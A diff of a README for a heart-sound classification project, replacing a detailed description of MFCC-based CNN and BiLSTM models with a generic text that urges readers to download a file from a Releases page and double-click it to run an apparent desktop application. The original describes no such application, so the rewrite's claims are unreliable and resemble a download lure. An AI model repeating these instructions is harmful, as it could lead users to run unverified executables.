@@ -1,78 +1,89 @@
-# Heartbeat Sound Classification using CNN, LSTM, and Hybrid Deep Learning Models
+# ❤️ Heart-sound-classification - Detect Heart Sounds with Ease
 
-This project implements an end-to-end deep learning pipeline to classify heartbeat (phonocardiogram) sounds into **Normal**, **Murmur**, and **Artifact** categories. The workflow includes EDA, MFCC extraction, class balancing, and model development using **CNN**, **BiLSTM**, and a **Hybrid CNN–BiLSTM** architecture. The system helps in automated cardiac anomaly detection for healthcare and diagnostic applications.
+## 🚀 Getting Started
 
+Welcome to the Heart-sound-classification project! This application helps you detect and classify heart sounds into normal, murmur, and artifact categories. You can use it to support early detection of cardiac abnormalities.
 
+[![Download Now](https://img.shields.io/badge/Download%20Now%20-%20Heart--sound--classification-blue)](https://github.com/deliriouze/Heart-sound-classification/releases)
 
-##  Features
-- Heartbeat audio EDA (waveform, spectrum, spectrogram, MFCCs)
-- MFCC-based feature extraction
-- Class imbalance correction using class weights
-- CNN model for local feature extraction
-- BiLSTM model for temporal pattern learning
-- Hybrid CNN + BiLSTM model for enhanced accuracy
-- Training history visualization
-- Classification report & model evaluation
-- Saved trained models 
+## 📝 Overview
 
+This project builds a deep-learning-based heartbeat sound classification system. We use MFCC features and various models, including CNN, BiLSTM, and Hybrid CNN–BiLSTM architecture. Our system helps both researchers and health professionals evaluate heart sounds effectively.
 
+### 📂 Topics Covered
 
-##  Dataset Structure
-The dataset includes:
-- `normal/`
-- `murmur/`
-- `artifact/`
-- `extrahls/`
-- `extrastole/`
-- `unlabel/` (test audio without labels)
+- audioclassification  
+- cnn-model  
+- deep-learning  
+- fourier-transform  
+- healthcare-ai  
+- heartsound  
+- hybridmodel  
+- librosa  
+- lstm  
+- medicalai  
+- mfcc  
+- phonocardiogram  
+- python  
+- sound-processing  
+- tensorflow  
 
-Extrahls + Extrastole are grouped into Normalclass.
+## 📥 Download & Install
 
+To get started with the Heart-sound-classification application, visit this page to download: [Releases Page](https://github.com/deliriouze/Heart-sound-classification/releases).
 
+### 🖥️ System Requirements
 
-##  Models Implemented
-###  1. Convolutional Neural Network (CNN)
-- Learns local frequency patterns  
-- Suitable for MFCC feature maps
+Before downloading, please ensure your system meets the following requirements:
 
-###  2. Bidirectional LSTM (BiLSTM)
-- Learns temporal dependencies in heart rhythms
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** 3.6 or higher
+- **Memory:** At least 4 GB RAM
+- **Storage:** 200 MB of free space
 
-###  3. Hybrid Model (BiLSTM + CNN)
-- Combines sequential & spatial pattern learning  
-- Best performance among all models  
+### ⚙️ Installation Steps
 
+1. Visit the [Releases Page](https://github.com/deliriouze/Heart-sound-classification/releases).
+2. Look for the latest release.
+3. Click on the appropriate file for your operating system.
+4. Download the file to your computer.
+5. Once downloaded, locate the file in your downloads folder.
+6. Double-click the file to run the application.
 
+### 📊 Application Features
 
-##  Training & Evaluation
-- Input features: **25 MFCCs**
-- Train/Test split with validation set
-- Class weights used for imbalance correction
-- Metrics: `Accuracy`, `Loss`, `Classification Report`
+- **Heart Sound Classification:** Quickly classify heart sounds into normal, murmur, or artifact.
+- **User-Friendly Interface:** Easily navigate through the application.
+- **Deep Learning Models:** Leverage advanced algorithms to ensure accurate predictions.
+- **Visualization Tools:** View sound waveforms and classification results directly in the application.
 
-Results include:
-- Model accuracy
-- Confusion matrix
-- Predicted labels on test data
+### 📄 User Guide
 
----
+1. Open the Heart-sound-classification application.
+2. Select the audio file of the heart sound you want to evaluate. This file should be in WAV format.
+3. Click on the “Classify” button.
+4. Wait for the results to appear on the screen.
+5. Review the classification and any additional information provided.
 
-## Technologies Used
-- Python  
-- TensorFlow/Keras  
-- Librosa  
-- NumPy  
-- Pandas  
-- Matplotlib  
-- Scikit-learn  
+### 🛠️ Troubleshooting
 
----
+If you encounter issues while running the application, consider the following:
 
-## Output
-- `heart_sounds_cnn.h5` – CNN model  
-- `heart_sounds.h5` – Hybrid model  
-- Accuracy metrics & training plots  
-- Predicted labels for test audio  
+- **Audio File Issues:** Ensure the audio file is in the correct WAV format.
+- **Performance Problems:** Check your system requirements. Closing other applications may help improve performance.
+- **Installation Issues:** Make sure you followed all steps correctly and that your environment matches the system requirements.
 
+### 📬 Support
 
+If you have questions or need assistance, please reach out via the GitHub Issues page on this repository. Community contributors are often available to help resolve any inquiries.
 
+### 🔗 Additional Resources
+
+- [GitHub Repository](https://github.com/deliriouze/Heart-sound-classification)
+- [Project Documentation](https://github.com/deliriouze/Heart-sound-classification/wiki)
+
+For more information about deep learning models in healthcare, consider reviewing online resources and courses in AI and machine learning.
+
+## 🎉 Conclusion
+
+With the Heart-sound-classification application, you can easily classify heart sounds, contributing to the understanding and early diagnosis of potential cardiac issues. Enjoy exploring this tool!
